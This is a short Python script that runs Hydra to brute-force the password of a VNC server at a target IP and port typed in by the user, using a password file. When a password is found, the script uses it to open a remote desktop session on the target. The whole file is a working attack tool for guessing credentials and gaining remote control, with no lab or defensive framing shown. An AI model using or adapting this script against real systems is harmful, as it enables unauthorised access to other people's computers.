import subprocess

def run_hydra(ip, port, password_file):
    try:
        # Run Hydra command (adding speed limit with -t 1)
        hydra_command = ["hydra", "-s", str(port), "-P", password_file, "-t", "1", ip, "vnc"]
        print(f"\n[*] Starting brute-force process, please wait... ")
        
        # Capture Hydra output
        process = subprocess.run(hydra_command, capture_output=True, text=True)
        output = process.stdout
        #print("[*] Hydra output:")
        #print(output)

        # Process output to check for successful password
        for line in output.splitlines():
            if "password:" in line:  # Find the password line
                print(f"[+] Successful session information found: {line}")
                # Extract and return the password from the line
                password = line.split("password:")[1].strip()  # Remove "password:" part
                return password
        else:
            print("[-] No password found.")
            return None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def connect_vncviewer(ip, port, password):
    try:
        print("\n[*] Starting VNC connection...")
        # Run subprocess for VNC Viewer and suppress output
        process = subprocess.run(
            ["vncviewer", "-autopass", f"{ip}:{port}"],
            input=password.encode(),
            stdout=subprocess.DEVNULL,  # Suppress standard output
            stderr=subprocess.DEVNULL   # Suppress error output
        )
    except Exception as e:
        print(f"[!] Error occurred while running VNC Viewer: {e}")

# Information for running Hydra
ip = input("\nEnter target system IP address: ")
port = input("Enter target system port (default 5900): ")
password_file = "pass.txt"

# Run Hydra command and get the result
found_password = run_hydra(ip, port, password_file)
if found_password:
    print(f"[+] Found Password: {found_password}")
    # Start VNC connection with the password
    connect_vncviewer(ip, port, found_password)
else:
    print("[-] No credentials found.")
